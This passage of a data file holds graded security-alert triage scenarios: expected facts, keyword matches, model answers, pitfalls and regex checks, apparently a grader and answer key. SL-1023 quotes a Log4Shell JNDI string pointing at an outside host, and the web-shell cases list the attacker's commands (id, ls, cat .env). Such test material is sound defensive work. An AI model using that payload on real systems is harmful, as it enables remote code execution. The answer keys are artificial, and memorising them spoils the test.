      { label: "the email to oceanlink-freight.test about updated bank details", matches: ["oceanlink", "bank details", "supplier", "fraud"], in: "happened" },
      { label: "203.0.113.140 also sent the look-alike email in SL-1001", matches: ["sl-1001", "payroll", "look-alike", "same address"], in: "confirmed" },
      { label: "d.okafor was in the office on 10.20.4.37 at the time", matches: ["office", "10.20.4.37", "08:52", "working"], in: "confirmed" },
    ],
    next: [
      { label: "escalating to Level 2", matches: ["escalat", "l2", "level 2"] },
      { label: "resetting the password and ending the session", matches: ["reset", "password", "session", "revoke"] },
      { label: "disabling legacy protocols", matches: ["legacy", "imap", "disable"] },
      { label: "contacting OceanLink by phone and holding the payment change", matches: ["oceanlink", "supplier", "phone", "finance", "hold"] },
      { label: "checking the other SL-1001 recipients", matches: ["other recipients", "sl-1001", "recipients", "other staff"] },
    ],
    model: {
      happened:
        "At 11:04 [[203.0.113.140]] signed in to d.okafor's mailbox using [[IMAP, a legacy protocol that skips MFA]]. Within six minutes the session created an [[inbox rule ('AP') that hides mail about banks and invoices]], read 23 items in the Supplier payments folder, and sent an email to ap@oceanlink-freight.test titled [[Updated bank details for next payment]], which was not saved in Sent Items.",
      confirmed:
        "The sign-in log shows d.okafor working in the office on 10.20.4.37 (active since 08:52) and normally signs in from 10.20.4.0/24 only, so this was not them. [[203.0.113.140 is the address that sent the look-alike payroll email in SL-1001]], so the password was very likely taken there. Legacy mail protocols are enabled on the account, so MFA was never asked.",
      unknown:
        "I do not know whether OceanLink has acted on the email or whether a payment has already gone to a changed account. I do not know what else was read, or whether other accounts were hit by the same campaign.",
      next: "Escalate now. Please [[reset d.okafor's password and end the session]], [[disable legacy protocols]] on the account, remove the inbox rule, [[contact OceanLink by phone using a number we already hold]] and have Finance put any bank detail change on hold, and check the other recipients of the SL-1001 email.",
    },
    pitfalls: [
      "Seeing 'MFA not required' and moving on. That is exactly how the attacker got in without a prompt.",
      "Treating this as separate from SL-1001. The same address links the two.",
      "Forgetting the money. The email to the supplier can cost real cash, so it needs a phone call, not just a password reset.",
    ],
  },
  "SL-1015": {
    facts: [
      { label: "the new address 203.0.113.166", matches: ["203.0.113.166"], in: "happened" },
      { label: "the service account svc_bi_report", matches: ["svc_bi_report"], in: "happened" },
      { label: "the whole CUSTOMER_ORDERS table copied out (COPY INTO, about 2.4 million rows)", matches: ["copy into", "customer_orders", "2.4", "2,412,877", "618", "exported", "export"], in: "happened" },
      { label: "the destination files-transit.test", matches: ["files-transit"], in: "happened" },
      { label: "the account normally signs in only at 02:00 from the reporting server 10.20.3.40", matches: ["10.20.3.40", "02:00", "nightly", "scheduled", "reporting server", "bi server"], in: "confirmed" },
      { label: "it is password only with no MFA or network restriction", matches: ["password only", "password-only", "no mfa", "without mfa", "network restriction", "network policy"], in: "confirmed" },
      { label: "its credentials appear in an infostealer listing", matches: ["infostealer", "info-stealer", "stealer", "credential exposure", "threat intel", "leaked"], in: "confirmed" },
      { label: "the table holds customer names and addresses (personal data)", matches: ["personal data", "customer names", "addresses", "customer data", "pii"], in: "confirmed" },
    ],
    next: [
      { label: "escalating to Level 2 as a possible data breach", matches: ["escalat", "l2", "level 2", "breach", "incident"] },
      { label: "disabling the account and rotating its credentials", matches: ["disable", "rotate", "reset", "revoke", "credential", "password"] },
      { label: "blocking 203.0.113.166 and files-transit.test", matches: ["block"] },
      { label: "working out exactly what was copied and telling the data owner", matches: ["data owner", "what was copied", "affected", "assess", "which data", "notify"] },
      { label: "finding the infected laptop and checking other service accounts", matches: ["laptop", "other service accounts", "other accounts", "infected"] },
    ],
    model: {
      happened:
        "At 18:51 the warehouse service account [[svc_bi_report]] signed in from [[203.0.113.166]], an address it has never used, with a command-line client. Between 18:55 and 19:06 it created a temporary stage pointing at [[files-transit.test]] and ran [[three COPY INTO commands that copied out the whole CUSTOMER_ORDERS table]], about 2.4 million rows and 618 MB.",
      confirmed:
        "The sign-in history shows this account only ever signs in at 02:00 from the reporting server, [[10.20.3.40]]. It is protected by a [[password only]] with no MFA and no network restriction, and the password has not changed since November 2025. The threat-intel feed lists the account's password in an [[infostealer log dated Oct 19]]. CUSTOMER_ORDERS holds [[customer names and delivery addresses]], so this is personal data.",
      unknown:
        "I do not know whether the copied data has been sold or used yet, or whether the same password works anywhere else. I do not know which laptop was infected, and I have not checked whether other service accounts were used from 203.0.113.166.",
      next: "Escalate now as a possible data breach. Please [[disable svc_bi_report and rotate its credentials]], [[block 203.0.113.166 and files-transit.test]], work out exactly what was copied and tell the data owner, and [[find the infected laptop]] and check the other service accounts for the same exposure.",
    },
    pitfalls: [
      "Treating the login as normal because the password was right. A correct password only proves someone has the password, not that it is the real owner.",
      "Stopping at the sign-in. The query history shows the real damage: a whole table copied out.",
      "Forgetting where the password came from. A leaked credential may also work on other systems.",
    ],
    avoid: [{ pattern: "(warehouse|platform|vendor)[^.]{0,25}(was|were|has been|got)\\s+(hacked|breached|compromised)", message: "The evidence shows a valid password was used. Nothing says the warehouse platform itself was breached." }],
  },
  "SL-1016": {
    facts: [
      { label: "PsExec started from JUMP-ADM-01 at 01:12", matches: ["psexec", "jump-adm-01", "01:12"], in: "happened" },
      { label: "run by svc-patch against the 12 file servers FS-01 to FS-12", matches: ["svc-patch", "12 ", "fs-01", "twelve", "file servers"], in: "happened" },
      { label: "it was installing a Windows patch (wusa, KB5044)", matches: ["wusa", "patch", "kb5044", "update", "msu"], in: "happened" },
      { label: "the approved change CHG-2310 covers these servers and window", matches: ["chg-2310", "approved change", "change record", "change ticket"], in: "confirmed" },
      { label: "the program is the genuine tool, signed by Microsoft", matches: ["signed", "microsoft", "genuine", "sysinternals", "legitimate", "hash"], in: "confirmed" },
      { label: "svc-patch only logs on from the jump server and did the same last month", matches: ["only from", "jump server", "previous", "last month", "september", "usual", "normal"], in: "confirmed" },
      { label: "the servers show the patch installed, the PsExec service removed and no damage", matches: ["installed", "removed", "psexesvc", "no new", "no mass", "encrypt", "nothing unusual"], in: "confirmed" },
    ],
    next: [
      { label: "closing it as a false positive and noting CHG-2310", matches: ["close", "false positive", "chg-2310"] },
      { label: "tuning the rule for approved patch windows", matches: ["tune", "tuning", "exclude", "exception", "allow", "approved window", "patch window"] },
      { label: "saying no escalation is needed", matches: ["no escalation", "not escalat", "no need to escalat", "does not need to be escalated"] },
    ],
    model: {
      happened:
        "At 01:12 [[svc-patch]] started [[PsExec]] on [[JUMP-ADM-01]] and used it to run a Windows update installer (wusa with [[KB5044]]) on all [[12 file servers, FS-01 to FS-12]]. The run finished at 01:17. The rule fired because PsExec reached more than ten servers in under five minutes.",
      confirmed:
        "The change calendar has [[CHG-2310, an approved out-of-band patch for exactly these 12 servers, window 01:00 to 03:00]]. The EDR shows a [[genuine PsExec64.exe signed by Microsoft]] (hash 7a1c9e04…) started by the scheduled task 'Oct-OOB-Patch'. The auth log shows svc-patch [[only logs on from the jump server]], as it did in September and August. On the targets the patch is installed, the PsExec service was removed, and there are [[no new connections, tasks or file damage]].",
      unknown: "Nothing that changes the call. I did not speak to Infrastructure, because the ticket, the account, the host and the time all match.",
      next: "Close as a false positive and note CHG-2310. No escalation is needed. Suggest that the detection owner [[exclude svc-patch on JUMP-ADM-01 during approved change windows]] and keep the rule active for every other account and host.",
    },
    pitfalls: [
      "Escalating because PsExec appears in ransomware reports. Both attackers and administrators use it, so the context decides.",
      "Closing on the ticket alone. Check that the account, host and time actually match the ticket.",
      "Skipping the target servers. They show the patch installed and nothing destructive, which is what rules out ransomware.",
    ],
    avoid: [{ pattern: "(is|was|were|looks like|appears to be|indicates)\\s+(an?\\s+)?(ransomware|attack|compromise|compromised|malicious|lateral movement)", message: "A signed tool, an approved change and healthy servers explain this. Calling it ransomware or an attack contradicts the evidence." }],
  },
  "SL-1017": {
    facts: [
      { label: "p.sharma clicked the 'Shared with you: Q4 supplier contracts' link at 10:41", matches: ["sharma", "10:41", "shared with you", "supplier contracts"], in: "happened" },
      { label: "the link goes to harborpine-sso.test, a fake sign-in page", matches: ["harborpine-sso", "fake", "sign-in page", "login page", "phishing page", "look-alike", "lookalike"], in: "happened" },
      { label: "p.sharma reported it at 10:44", matches: ["reported", "report phish", "10:44"], in: "happened" },
      { label: "nine people received the email", matches: ["nine", "9 ", "recipients", "eight others", "other mailboxes", "sent to"], in: "happened" },
      { label: "no form data was sent (no POST), so nothing was entered", matches: ["no post", "no form", "nothing was entered", "nothing entered", "did not enter", "didn't enter", "not submitted", "no submission", "no credentials", "only loaded", "only viewed"], in: "confirmed" },
      { label: "no sign-in from a new address, no new device, no MFA or mailbox rule changes", matches: ["no sign-in", "no new sign", "new device", "mfa", "mailbox rule", "no unusual", "only from"], in: "confirmed" },
      { label: "f.reyes also clicked but the proxy blocked it", matches: ["reyes", "blocked"], in: "confirmed" },
      { label: "the domain is two days old and now categorised as phishing", matches: ["two days", "2 days", "newly registered", "registered", "phishing category", "categoris", "categoriz"], in: "confirmed" },
    ],
    next: [
      { label: "saying no escalation is needed and why", matches: ["no escalation", "not escalat", "no need to escalat", "does not need", "not need to escalat", "handle"] },
      { label: "blocking harborpine-sso.test", matches: ["block"] },
      { label: "removing the email from the other mailboxes", matches: ["remove", "delete", "purge", "other mailboxes", "recipients", "search"] },
      { label: "checking with the users and watching their sign-ins", matches: ["monitor", "watch", "remind", "confirm", "ask", "inform", "tell", "advise"] },
    ],
    model: {
      happened:
        "At 10:38 nine staff received an email titled [[Shared with you: Q4 supplier contracts]] from share@[[harborpine-sso.test]], a fake document-sharing page. [[p.sharma]] clicked the link at 10:41, looked at the page for under a minute and [[reported the email at 10:44]]. f.reyes clicked at 10:47.",
      confirmed:
        "The proxy log shows p.sharma only loaded the page (GET requests) and [[sent no form data (no POST)]], so nothing was typed in. The identity log shows [[no sign-in from any new address or device]], no MFA change and no new mailbox rule since 10:41. The domain was registered two days ago and was put in the phishing category at 10:42, so f.reyes's click at 10:47 was [[blocked]].",
      unknown:
        "I have not yet heard from p.sharma, so I cannot rule out that something was typed on another device. I also do not know whether the other seven recipients opened the email on a phone, outside our proxy.",
      next: "No escalation is needed, because nothing was entered and no account activity followed. I will [[block harborpine-sso.test]], [[remove the email from the other eight mailboxes]], ask p.sharma and f.reyes to confirm they typed nothing, and watch both accounts' sign-ins for the rest of the day. If a POST or a new sign-in appears, I will escalate.",
    },
    pitfalls: [
      "Escalating every user-reported phish. Check whether anything was entered and whether the account was used first.",
      "Believing MFA makes a click harmless. Some fake pages copy the session after MFA, so check the sign-in log for a new address.",
      "Forgetting the other recipients. One report usually means several people received the email.",
    ],
    avoid: [{ pattern: "(password|credentials|account|mailbox)[^.]{0,25}(was|were|is|has been|have been)\\s+(stolen|compromised|taken)", message: "The proxy shows no form submission and the identity log shows no new sign-in. Saying the password or account was stolen contradicts the evidence." }],
  },
  "SL-1018": {
    facts: [
      { label: "the account r.dsouza", matches: ["dsouza"], in: "happened" },
      { label: "14 failed sign-ins between 08:37 and 08:44", matches: ["14", "failed", "08:37", "08:44"], in: "happened" },
      { label: "the account was locked out", matches: ["lock"], in: "happened" },
      { label: "all from one address, 10.20.30.115, a phone", matches: ["10.20.30.115", "iphone", "phone", "mobile"], in: "happened" },
      { label: "the password was changed the day before", matches: ["changed", "reset", "expired", "yesterday", "oct 23", "17:20", "new password"], in: "confirmed" },
      { label: "the source is internal and the phone is registered to the user", matches: ["internal", "registered", "wi-fi", "own phone", "known device", "inside"], in: "confirmed" },
      { label: "help desk ticket INC-5540 and the unlock", matches: ["inc-5540", "help desk", "ticket", "unlock"], in: "confirmed" },
      { label: "a normal sign-in from the usual laptop afterwards, MFA passed", matches: ["09:03", "laptop", "mfa", "usual"], in: "confirmed" },
    ],
    next: [
      { label: "closing it as a false positive", matches: ["close", "false positive"] },
      { label: "asking r.dsouza to update the saved password on the phone", matches: ["update", "phone", "saved password", "tell", "ask", "inform", "remind"] },
      { label: "saying no escalation is needed", matches: ["no escalation", "not escalat", "no need to escalat", "does not need"] },
    ],
    model: {
      happened:
        "[[r.dsouza]]'s account was locked out at [[08:44]] after [[14 failed sign-ins]] starting at 08:37. Every failure came from the same address, [[10.20.30.115]], using the iPhone mail app, one attempt every 30 seconds.",
      confirmed:
        "r.dsouza [[changed the password yesterday at 17:20]] after it expired, so the phone is almost certainly using the old one. 10.20.30.115 is the [[staff phone Wi-Fi]] and the iPhone is registered to r.dsouza. The user opened help desk ticket [[INC-5540]] at 08:50 and was unlocked at 08:58, and at 09:03 a normal [[sign-in from the usual laptop passed MFA]]. There were no failures from any outside address.",
      unknown: "Nothing that changes the call. I did not speak to r.dsouza, because the ticket and the password change already explain it.",
      next: "Close as a false positive. No escalation is needed. I would ask r.dsouza to [[update the saved password on the phone]] so it does not lock the account again.",
    },
    pitfalls: [
      "Calling every lockout a brute-force attack. Look at where the failures came from first.",
      "Missing the password change. A change the day before is the classic cause of a phone retrying an old password.",
      "Not checking what happened afterwards. A normal sign-in from the user's own laptop with MFA shows the real user is fine.",
    ],
    avoid: [{ pattern: "(is|was|looks like|appears to be)\\s+(an?\\s+)?(brute[- ]?force|attack|attacker|compromise|compromised)", message: "One registered phone, a password change the day before and a help desk ticket explain this. Calling it an attack contradicts the evidence." }],
  },
  "SL-1019": {
    facts: [
      { label: "m.pillai's laptop MKT-WS-019", matches: ["pillai", "mkt-ws-019"], in: "happened" },
      { label: "the download of ZoomWorkspace_Setup.exe", matches: ["zoomworkspace", "installer", "setup.exe", "download"], in: "happened" },
      { label: "from the look-alike site zoom-installer-download.test, reached through a sponsored search result", matches: ["zoom-installer", "look-alike", "lookalike", "fake site", "sponsored", "search ad", "search result"], in: "happened" },
      { label: "antivirus detected a password-stealing trojan at 11:25", matches: ["trojan", "stealer", "detected", "11:25"], in: "happened" },
      { label: "the file was quarantined and deleted", matches: ["quarantin", "deleted", "removed"], in: "confirmed" },
      { label: "it never ran: no process started from it", matches: ["never ran", "not executed", "did not run", "no process", "not run", "no new process", "wasn't run"], in: "confirmed" },
      { label: "no new connections and no other computer contacted the site", matches: ["no other", "no new connection", "no outbound", "other computer", "other hosts", "no connection"], in: "confirmed" },
      { label: "the website is malicious", matches: ["malicious", "intel", "lookup", "fake"], in: "confirmed" },
    ],
    next: [
      { label: "saying no escalation is needed", matches: ["no escalation", "not escalat", "no need to escalat", "does not need", "handle"] },
      { label: "blocking zoom-installer-download.test", matches: ["block"] },
      { label: "reminding m.pillai to use official download sites", matches: ["remind", "tell", "inform", "advise", "official", "awareness", "ask"] },
    ],
    model: {
      happened:
        "At 11:24 [[m.pillai]] on [[MKT-WS-019]] clicked a [[sponsored search result]] and downloaded [[ZoomWorkspace_Setup.exe]] from [[zoom-installer-download.test]], a look-alike download site. At 11:25 antivirus detected a [[password-stealing trojan]] in the file.",
      confirmed:
        "Antivirus [[quarantined and deleted]] the file, and the endpoint data shows [[no process started from it]] and no new outbound connections. The proxy shows [[no other computer]] has contacted the site. The intel lookup lists the domain and file hash as malicious.",
      unknown: "I do not know whether m.pillai saw a warning or tried to run the file before it was removed, but the endpoint shows nothing started. I will confirm with the user.",
      next: "No escalation is needed, because the malware was removed before it ran. I will [[block zoom-installer-download.test]] and [[remind m.pillai to download software only from the official site]], then close the case. If anything had run, I would escalate.",
    },
    pitfalls: [
      "Treating it as a false positive because antivirus handled it. The file really was malware, so this is a true positive that was contained.",
      "Escalating when it never ran. Check the process and network data first.",
      "Forgetting the source. The look-alike site, not just the file, should be blocked.",
    ],
    avoid: [{ pattern: "(is|was|has been|got|became)\\s+(infected|compromised)", message: "The file was removed before it ran and nothing started. Saying the laptop is infected contradicts the evidence." }],
  },
  "SL-1020": {
    facts: [
      { label: "the address 198.51.100.141", matches: ["198.51.100.141"], in: "happened" },
      { label: "a PHP file (avatar.php / 9f3a.php) uploaded through the picture form", matches: ["avatar.php", "9f3a", "php", "web shell", "webshell", "upload"], in: "happened" },
      { label: "the file was then run with commands (id, ls, cat .env)", matches: ["commands", "id", "ls", "cat", ".env", "run", "executed"], in: "happened" },
      { label: "web-app-03, the portal web server, at about 15:31", matches: ["web-app-03", "15:31", "portal"], in: "happened" },
      { label: "the web server ran the commands (php-fpm started sh)", matches: ["php-fpm", "www-data", "sh -c", "shell", "process"], in: "confirmed" },
      { label: ".env was read, so the database password is exposed", matches: [".env", "database password", "password", "api key", "secret", "exposed"], in: "confirmed" },
      { label: "uploads should only hold pictures", matches: ["only", "pictures", "images", ".jpg", "should not"], in: "confirmed" },
      { label: "no penetration test or planned work", matches: ["no pen", "no penetration", "not booked", "no planned", "no change", "no test"], in: "confirmed" },
    ],
    next: [
      { label: "escalating to Level 2", matches: ["escalat", "l2", "level 2"] },
      { label: "isolating web-app-03 or taking the portal offline", matches: ["isolate", "offline", "contain", "take down", "disconnect"] },
      { label: "rotating the database password and API key", matches: ["rotate", "reset", "change the password", "database password", "api key", "secrets"] },
      { label: "keeping a copy of the file and removing it", matches: ["preserve", "copy", "remove", "delete", "evidence"] },
      { label: "blocking 198.51.100.141", matches: ["block"] },
    ],
    model: {
      happened:
        "At 15:31 [[198.51.100.141]] uploaded a [[PHP file named avatar.php]] through the portal's profile picture form on [[web-app-03]]. It was saved as 9f3a.php in the uploads folder. At 15:33 the same address [[called the file with commands]] (id, ls) and at 15:36 used it to read the [[.env file]].",
      confirmed:
        "The access log shows the upload and each command returned 200. The process log shows the web server ([[php-fpm, running as www-data, started sh]]) running those commands. The uploads folder should hold only pictures, and no penetration test or developer change is booked. The .env file holds the [[database password and an API key]], so those are exposed.",
      unknown: "I do not know how the attacker found the upload form, whether they have already used the database password, or whether other files were uploaded. I have not checked the database logs.",
      next: "Escalate now. Please [[isolate web-app-03]] or take the portal offline, keep a copy of the file for analysis, [[rotate the database password and API key]], review database access and block 198.51.100.141.",
    },
    pitfalls: [
      "Assuming the firewall stopped it. The upload and every command returned 200, so they all worked.",
      "Looking only at the upload. The commands show the file is already in use.",
      "Forgetting the secrets file. Anything the web server can read has to be treated as exposed.",
    ],
    avoid: [{ pattern: "(was|were|been|got)\\s+(blocked|stopped|prevented)", message: "The upload and every command returned 200, so nothing was blocked." }],
  },
  "SL-1021": {
    facts: [
      { label: "admin t.venkat's session s-8841", matches: ["venkat", "s-8841", "session"], in: "happened" },
      { label: "the session was used from 203.0.113.178 at 13:46", matches: ["203.0.113.178", "13:46", "second address", "new address"], in: "happened" },
      { label: "a new account svc-sso-sync was created and made Super Admin", matches: ["svc-sso-sync", "super admin", "new admin", "new account"], in: "happened" },
      { label: "a non-expiring API token was created and all users were exported", matches: ["api token", "1,214", "exported", "export", "no expiry", "non-expiring"], in: "happened" },
      { label: "no password or MFA event from the second address, so the session was replayed rather than a new login", matches: ["no mfa", "no password", "no sign-in", "not a new login", "replay", "reused", "re-used", "hijack", "stolen session", "stolen"], in: "confirmed" },
      { label: "t.venkat's laptop stayed on the office network (10.20.4.22) and behaved normally", matches: ["10.20.4.22", "office", "laptop", "badge", "in the building"], in: "confirmed" },
      { label: "a HAR file with possible session cookies was uploaded to vendor ticket VND-77120 at 09:12", matches: ["har", "vnd-77120", "cookie", "09:12", "support ticket"], in: "confirmed" },
      { label: "the vendor reported unusual access to support attachments", matches: ["status page", "investigating", "unusual access", "13:30", "vendor reported", "vendor said", "vendor notice"], in: "confirmed" },
    ],
    next: [
      { label: "escalating to Level 2 as critical", matches: ["escalat", "l2", "level 2"] },
      { label: "ending all sessions for t.venkat and resetting the account", matches: ["revoke", "terminate", "end all", "kill", "sign out", "reset", "disable"] },
      { label: "disabling svc-sso-sync and revoking its API token", matches: ["svc-sso-sync", "api token", "token", "disable"] },
      { label: "contacting the vendor and reviewing what the admin account changed", matches: ["vendor", "review", "audit", "changes", "contact"] },
      { label: "blocking 203.0.113.178", matches: ["block"] },
    ],
    model: {
      happened:
        "Administrator [[t.venkat]]'s single sign-on session [[s-8841]] was used from [[203.0.113.178]] at 13:46. From that address someone exported all users, created a new account [[svc-sso-sync]], made it [[Super Admin]] and created an [[API token]] with no expiry, between 13:47 and 13:52.",
      confirmed:
        "The session log shows [[no password or MFA event]] from 203.0.113.178, so the session was reused, not a new login. t.venkat's laptop stayed on the office network ([[10.20.4.22]]) and behaved normally. At 09:12 t.venkat uploaded a [[HAR file]] to vendor ticket [[VND-77120]]; HAR files can contain session cookies. At 13:30 the [[vendor reported unusual access]] to support attachments. 203.0.113.178 is a hosting provider address.",
      unknown: "I do not know whether the vendor's access is the source of the stolen session, whether other admin sessions were taken, or what the API token has already been used for.",
      next: "Escalate now as critical. Please [[end all of t.venkat's sessions]] and reset the account, [[disable svc-sso-sync and revoke its API token]], review every change made since 13:46, [[contact the vendor]] about the HAR file and block 203.0.113.178.",
    },
    pitfalls: [
      "Looking for a stolen password. There is no sign-in from the second address, which is the sign that the session itself was taken.",
      "Thinking MFA protected the account. MFA is only asked at sign-in, and a stolen session skips it.",
      "Stopping at the session. The new Super Admin account and API token let the attacker stay even after the session ends.",
    ],
    avoid: [{ pattern: "(false positive|legitimate|harmless|benign|normal admin work|t\\.venkat (did|made|created) )", message: "t.venkat's laptop stayed in the office and the second address is a hosting provider. Calling this legitimate or caused by t.venkat contradicts the evidence." }],
  },
  "SL-1022": {
    facts: [
      { label: "203.0.113.87 sent requests to guestaccess.aspx on xfer-01 from 02:08", matches: ["203.0.113.87", "guestaccess", "02:08", "02:11", "guest access"], in: "happened" },
      { label: "a new page guest2.aspx appeared at 02:14, a web shell", matches: ["guest2.aspx", "web shell", "webshell", "02:14", "new page"], in: "happened" },
      { label: "the page was used to list and read the file table", matches: ["list", "read", "fileblob", "file table", "database"], in: "happened" },
      { label: "6.4 GB left the server by 02:41", matches: ["6.4", "gb", "02:41", "leave", "left", "sent"], in: "happened" },
      { label: "41,220 database rows were read, far above normal", matches: ["41,220", "1,408", "fileblob", "rows read", "200 rows"], in: "confirmed" },
      { label: "only 203.0.113.87 used the page and it contacted no other internal host", matches: ["only", "no other", "no other internal", "any other"], in: "confirmed" },
      { label: "the page is not in the deployment manifest", matches: ["manifest", "not listed", "not deployed", "unapproved", "oct 17", "not approved"], in: "confirmed" },
      { label: "xfer-01 was on 2024.1.3, without the fix for the vendor's SQL injection flaw", matches: ["2024.1.3", "2024.1.4", "sql injection", "unpatched", "not patched", "advisory", "vendor"], in: "confirmed" },
    ],
    next: [
      { label: "escalating to Level 2 as critical", matches: ["escalat", "l2", "level 2"] },
      { label: "isolating xfer-01 or taking it offline", matches: ["isolate", "offline", "disconnect", "contain", "take down"] },
      { label: "preserving guest2.aspx and the logs", matches: ["preserve", "copy", "keep", "evidence", "forensic", "image"] },
      { label: "patching to 2024.1.4 and rotating the application's database password", matches: ["patch", "update", "2024.1.4", "rotate", "password"] },
      { label: "working out which customer files were taken", matches: ["customer", "which files", "notify", "impact", "breach", "data"] },
      { label: "blocking 203.0.113.87", matches: ["block"] },
    ],
    model: {
      happened:
        "From 02:08 [[203.0.113.87]] sent requests to [[guestaccess.aspx]] on xfer-01. A large request succeeded at 02:11 and a [[new page, guest2.aspx]], appeared at 02:14. The same address then used the page to [[list and read the file table]], and [[6.4 GB]] left the server by 02:41.",
      confirmed:
        "The database audit shows the web application account read [[41,220 rows from FileBlob]], against about 200 in a normal busy hour. Only 203.0.113.87 used the page and it contacted no other internal host. guest2.aspx is [[not in the deployment manifest]]. xfer-01 runs [[2024.1.3]] and the vendor's later advisory describes a SQL injection flaw fixed in 2024.1.4.",
      unknown: "I do not know which customers' files were in the 41,220 rows, whether the attacker also reached other systems from the database, or whether other files were planted on the server.",
      next: "Escalate now as critical. Please [[isolate xfer-01]], keep a copy of guest2.aspx and all logs, install [[2024.1.4]], rotate the application's database password, block 203.0.113.87 and start working out [[which customer files were taken]].",
    },
    pitfalls: [
      "Treating the new file as the whole incident. The data read and the 6.4 GB leaving are what turn this into a breach.",
      "Waiting for a patch advisory. The attack was already under way before the vendor announced anything.",
      "Forgetting the database. The web shell is only the door, so check what the application account read.",
    ],
    avoid: [{ pattern: "(was|were|been|got)\\s+(blocked|stopped|prevented|contained)", message: "The firewall allowed 6.4 GB out and the database returned the rows. Nothing was blocked." }],
  },
  "SL-1023": {
    facts: [
      { label: "198.51.100.208 sent 14 requests with the Log4Shell string between 14:02 and 14:05", matches: ["198.51.100.208", "14 requests", "14:02", "14:05", "jndi", "log4"], in: "happened" },
      { label: "four servers were targeted: portal-web, api-gw-02, intranet-01 and hr-app-01", matches: ["four", "api-gw-02", "portal-web", "intranet-01", "hr-app-01"], in: "happened" },
      { label: "the WAF blocked most but allowed requests to api-gw-02, which is in monitor-only mode", matches: ["blocked", "allowed", "monitor-only", "monitor only"], in: "happened" },
      { label: "the string points to 203.0.113.45", matches: ["203.0.113.45"], in: "happened" },
      { label: "api-gw-02 and hr-app-01 run Log4j 2.17.1, which is fixed", matches: ["2.17.1", "patched", "fixed", "updated"], in: "confirmed" },
      { label: "the other two servers do not use Log4j", matches: ["do not use", "not used", "python", ".net", "no log4j"], in: "confirmed" },
      { label: "no connection or DNS query to 203.0.113.45", matches: ["no connection", "no outbound", "no dns", "egress", "callback", "call back", "203.0.113.45"], in: "confirmed" },
      { label: "nothing ran on api-gw-02: no child process or exception", matches: ["child process", "no process", "no exception", "nothing ran", "no new", "plain text"], in: "confirmed" },
    ],
    next: [
      { label: "saying no escalation is needed", matches: ["no escalation", "not escalat", "no need to escalat", "does not need", "handle"] },
      { label: "blocking 198.51.100.208", matches: ["block"] },
      { label: "switching the api-gw-02 WAF from monitor-only to blocking", matches: ["monitor", "blocking mode", "switch", "enable", "enforce", "block mode"] },
      { label: "closing the case", matches: ["close"] },
    ],
    model: {
      happened:
        "Between 14:02 and 14:05 [[198.51.100.208]] sent [[14 requests]] containing the Log4Shell string ${jndi:ldap://[[203.0.113.45]]:1389/a} to [[portal-web, api-gw-02, intranet-01 and hr-app-01]]. The WAF blocked most of them, but allowed the ones to api-gw-02 because that WAF is in [[monitor-only]] mode.",
      confirmed:
        "The inventory shows api-gw-02 and hr-app-01 run Log4j [[2.17.1]], the fixed version, and the other two servers do not use Log4j. The egress logs show [[no connection and no DNS query]] to 203.0.113.45 from any of them. On api-gw-02 the string was only logged as plain text, with [[no exception and no child process]].",
      unknown: "I do not know why the scanner picked these four servers, or whether it has tried other applications that I have not checked, such as servers outside this alert.",
      next: "No escalation is needed, because no server was vulnerable and nothing called back. I will [[block 198.51.100.208]], ask for the api-gw-02 WAF to be switched from monitor-only to blocking, and close the case.",
    },
    pitfalls: [
      "Escalating because the string is famous. Check the version, the callback and the process activity first.",
      "Calling it a false positive. It was a real attack attempt, it just failed.",
      "Missing the monitor-only WAF. That setting is the only reason two requests were allowed.",
    ],
    avoid: [{ pattern: "(is|was|were|got|been)\\s+(compromised|exploited|breached|vulnerable)", message: "Both Java servers run the fixed Log4j 2.17.1 and nothing called out or ran. Saying a server was exploited or vulnerable contradicts the evidence." }],
  },
  "SL-1024": {
    facts: [
      { label: "the help desk (r.nair) reset a.menon's password and MFA at 07:50 after a phone call", matches: ["r.nair", "help desk", "07:50", "reset", "inc-5588", "phone call"], in: "happened" },
      { label: "a new authenticator was registered from 192.0.2.64 at 07:56", matches: ["192.0.2.64", "new authenticator", "new mfa", "new device", "07:56", "authenticator"], in: "happened" },
      { label: "the account exported the payee list (212 suppliers)", matches: ["payee", "212", "exported", "supplier list", "supplier master"], in: "happened" },
      { label: "a bank detail change was requested for Northwind Freight", matches: ["northwind", "bank detail", "bank change", "bank details"], in: "happened" },
      { label: "the caller was verified only with employee ID and date of birth, with no callback or manager approval", matches: ["date of birth", "employee id", "no callback", "callback", "manager approval", "weak", "verification"], in: "confirmed" },
      { label: "a.menon is on leave and her laptop has been offline since Oct 20", matches: ["leave", "travelling", "traveling", "away", "oct 20", "offline"], in: "confirmed" },
      { label: "192.0.2.64 is a hosting provider address and an unmanaged computer, not her usual office laptop", matches: ["hosting", "unmanaged", "vpn", "rented", "not her usual", "fin-lt-021", "10.20.5.14"], in: "confirmed" },
      { label: "no payment was released yet", matches: ["no payment", "not released", "waiting", "second approver", "pending"], in: "confirmed" },
    ],
    next: [
      { label: "escalating to Level 2 as high", matches: ["escalat", "l2", "level 2"] },
      { label: "disabling the account and ending its sessions", matches: ["disable", "lock", "revoke", "suspend", "terminate", "sign out", "end all"] },
      { label: "stopping the Northwind Freight bank change and warning Finance", matches: ["northwind", "stop", "cancel", "reject", "finance", "bank"] },
      { label: "reaching a.menon on a number from HR to confirm", matches: ["contact", "call", "confirm", "reach", "hr"] },
      { label: "reviewing how the help desk verifies resets", matches: ["help desk", "verification", "process", "review", "callback"] },
    ],
    model: {
      happened:
        "At 07:50 help desk agent [[r.nair]] reset [[a.menon]]'s password and cleared her MFA after a phone call (ticket INC-5588). At 07:56 a [[new authenticator]] was registered from [[192.0.2.64]]. The account then [[exported the payee list]] of 212 suppliers and requested a [[bank detail change for Northwind Freight]].",
      confirmed:
        "The caller was verified only with an [[employee ID and date of birth]]; there was [[no callback]] to the number on file and no manager approval. a.menon is [[on leave]] and her laptop has been offline since Oct 20. 192.0.2.64 is a [[hosting provider address]] and an unmanaged computer, not her usual office laptop. The bank change is still waiting for a second approver, so [[no payment has been released]].",
      unknown: "I do not know who made the call, whether a.menon's details were leaked earlier, or whether other accounts were reset the same way. I have not yet reached a.menon.",
      next: "Escalate now as high. Please [[disable a.menon's account and end its sessions]], [[stop the Northwind Freight bank change]] and warn Finance, reach a.menon on a number from HR, and check other recent help desk resets and the callback process.",
    },
    pitfalls: [
      "Trusting the reset because the help desk did it. The check used details an attacker can find, and nobody called back.",
      "Treating MFA as proof of identity. The attacker registered their own MFA device after the reset.",
      "Stopping at the sign-in. The payee export and bank change show what the attacker wanted.",
    ],
